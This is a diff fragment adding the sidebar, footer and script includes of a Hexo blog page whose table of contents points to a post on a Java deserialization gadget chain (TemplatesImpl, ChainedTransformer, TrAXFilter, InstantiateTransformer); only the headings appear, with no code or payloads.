+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-TemplatesImpl%E9%83%A8%E5%88%86"><span class="nav-number">2.1.</span> <span class="nav-text">1.TemplatesImpl部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-ChainedTransformer%E9%83%A8%E5%88%86"><span class="nav-number">2.2.</span> <span class="nav-text">2.ChainedTransformer部分</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-TrAXFilter%E9%83%A8%E5%88%86"><span class="nav-number">2.2.1.</span> <span class="nav-text">2.1 TrAXFilter部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-InstantiateTransformer%E9%83%A8%E5%88%86"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.2 InstantiateTransformer部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%9E%84%E9%80%A0%E9%93%BE"><span class="nav-number">2.3.</span> <span class="nav-text">3.构造链</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Narcher Alter</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Narcher Alter</span>
+</div>
+<!--
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
